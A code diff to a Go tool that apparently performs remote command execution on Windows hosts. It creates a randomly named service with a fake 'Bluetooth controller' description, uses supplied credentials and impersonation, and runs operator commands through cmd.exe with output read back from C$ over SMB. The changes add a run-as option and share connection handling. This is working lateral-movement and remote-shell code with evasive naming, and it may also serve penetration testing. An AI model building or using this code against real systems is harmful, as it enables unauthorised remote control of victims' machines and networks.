@@ -89,27 +89,6 @@ const (
 	// Service config information
 	SERVICE_CONFIG_DESCRIPTION     = 1
 	SERVICE_CONFIG_FAILURE_ACTIONS = 2
-
-	LOGON32_LOGON_NEW_CREDENTIALS = 9
-	LOGON32_PROVIDER_WINNT50      = 3
-)
-
-// Windows API function pointers
-var (
-	modadvapi32                 = syscall.NewLazyDLL("advapi32.dll")
-	procOpenSCManagerW          = modadvapi32.NewProc("OpenSCManagerW")
-	procCreateServiceW          = modadvapi32.NewProc("CreateServiceW")
-	procOpenServiceW            = modadvapi32.NewProc("OpenServiceW")
-	procStartServiceW           = modadvapi32.NewProc("StartServiceW")
-	procQueryServiceStatus      = modadvapi32.NewProc("QueryServiceStatus")
-	procCloseServiceHandle      = modadvapi32.NewProc("CloseServiceHandle")
-	procDeleteService           = modadvapi32.NewProc("DeleteService")
-	procChangeServiceConfigW    = modadvapi32.NewProc("ChangeServiceConfigW")
-	procChangeServiceConfig2W   = modadvapi32.NewProc("ChangeServiceConfig2W")
-	procControlService          = modadvapi32.NewProc("ControlService")
-	procLogonUserW              = modadvapi32.NewProc("LogonUserW")
-	procImpersonateLoggedOnUser = modadvapi32.NewProc("ImpersonateLoggedOnUser")
-	procRevertToSelf            = modadvapi32.NewProc("RevertToSelf")
 )
 
 // SERVICE_STATUS represents the status of a service
@@ -151,7 +130,7 @@ func ServiceStateToString(state uint32) string {
 }
 
 // Called during setup to prepare a service for use
-func CreateRemoteService(machineName, serviceName, displayName, description, binPath, username, password, domain string) error {
+func CreateRemoteService(machineName, serviceName, displayName, description, binPath, username, password, domain string, runas bool) error {
 	// Open Service Control Manager on remote machine
 	token, err := logonUser(username, domain, password)
 	if err != nil {
@@ -218,6 +197,13 @@ func CreateRemoteService(machineName, serviceName, displayName, description, bin
 		return nil
 	}
 	// Create the new service
+	lpServiceStartName := uintptr(0)
+	lpPassword := uintptr(0)
+	if runas {
+		lpServiceStartName = uintptr(unsafe.Pointer(UTF16PtrFromString(fmt.Sprintf("%s\\%s", domain, username))))
+		lpPassword = uintptr(unsafe.Pointer(UTF16PtrFromString(password)))
+	}
+
 	serviceHandle, _, err = procCreateServiceW.Call(
 		scmHandle,
 		uintptr(unsafe.Pointer(UTF16PtrFromString(serviceName))),
@@ -227,11 +213,11 @@ func CreateRemoteService(machineName, serviceName, displayName, description, bin
 		uintptr(SERVICE_DEMAND_START),
 		uintptr(SERVICE_ERROR_NORMAL),
 		uintptr(unsafe.Pointer(UTF16PtrFromString(binPath))),
-		0, // lpLoadOrderGroup
-		0, // lpdwTagId
-		0, // lpDependencies
-		0, // lpServiceStartName (account name)
-		0, // lpPassword
+		0,                  // lpLoadOrderGroup
+		0,                  // lpdwTagId
+		0,                  // lpDependencies
+		lpServiceStartName, // lpServiceStartName (account name)
+		lpPassword,         // lpPassword
 	)
 
 	if serviceHandle == 0 {
@@ -364,11 +350,11 @@ func checkServiceState(target string, user string, password string, domain strin
 	return ServiceStateToString(serviceStatus.DwCurrentState), nil
 }
 
-func handleServiceSession(target string, batch bool, username string, password string, domain string, servicename string, description string) {
+func handleServiceSession(target string, batch bool, username string, password string, domain string, servicename string, description string, runas bool) {
 	if servicename == "" {
 		servicename = getRandomString(12)
 	}
-	err := CreateRemoteService(target, servicename, servicename, "Bluetooth controller for XAIE", "cmd.exe /c cmd.exe", username, password, domain)
+	err := CreateRemoteService(target, servicename, servicename, "Bluetooth controller for XAIE", "cmd.exe /c cmd.exe", username, password, domain, runas)
 	if err != nil {
 		fmt.Printf("Failed to create service: %v\n", err)
 		return
@@ -378,6 +364,19 @@ func handleServiceSession(target string, batch bool, username string, password s
 	// Now we know a service with name=servicename should exist on the target
 	// Each time we provide a command, we will modify the binary of the service, start it and wait for it to finish
 	// Then we can read the output file via SMB
+	settings := &Settings{
+		User:        fmt.Sprintf("%s\\%s", domain, username),
+		Password:    password,
+		TargetShare: "ADMIN$",
+		Target:      target,
+	}
+
+	if !EstablishConnection(settings, "C$", true) {
+		fmt.Printf("failed to establish connection to C$ share on %s", settings.Target)
+		return
+	}
+	defer EstablishConnection(settings, "C$", false)
+	log.Printf("Successfully connected to C$ share on %s\n", target)
 
 	for true {
 		fmt.Printf("service@%s: ", target)
@@ -395,7 +394,8 @@ func handleServiceSession(target string, batch bool, username string, password s
 			continue
 		}
 		outputFile := fmt.Sprintf("\\\\%s\\C$\\Windows\\Temp\\%s.txt", target, getRandomString(12))
-		cmd := fmt.Sprintf("%%COMSPEC%% /k start /b /wait %%COMSPEC%% %s > %s 2>&1", command, outputFile)
+		//cmd := fmt.Sprintf("%%COMSPEC%% /k start /b /wait %%COMSPEC%% %s > %s 2>&1", command, outputFile)
+		cmd := fmt.Sprintf("%%COMSPEC%% /c %s > %s 2>&1", command, outputFile)
 		batchFile := fmt.Sprintf("\\\\%s\\C$\\Windows\\Temp\\%s.bat", target, getRandomString(18))
 		if batch {
 			// Make a batch file on the target at C:\Windows\Temp and then we will pass a command to execute this
